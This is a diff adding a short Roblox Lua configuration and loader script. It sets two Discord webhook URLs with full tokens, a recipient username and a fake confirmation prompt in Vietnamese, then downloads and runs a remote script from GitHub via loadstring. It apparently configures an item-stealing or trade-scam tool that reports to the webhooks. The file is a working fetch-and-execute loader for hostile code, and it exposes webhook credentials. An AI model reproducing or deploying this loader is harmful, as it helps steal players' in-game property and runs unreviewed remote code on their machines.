@@ -1,0 +1,7 @@
+LogsWebhook = "https://discord.com/api/webhooks/1334244142712094760/9EnHxOxTmGeL2r04tU9RuOPboeBCzoCu-ScFISOLSHxcON-c86a4QiHAhn_OipLZ0Qhl" 
+ExecutionWebhook = "https://discord.com/api/webhooks/1334244300292362402/HM9EtxFIsGMSoBfmcgU5Bto9S-7nv1GgT8vvMSVQ7YhS-yng4Drk4g1m_2X6U9mW74UR" 
+Username = "Trade234508" 
+PromptText = "OK để tiếp tục" 
+RandomizedPrompt = true -- để im vậy nếu mày không hiểu mày đang làm gì 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))() 
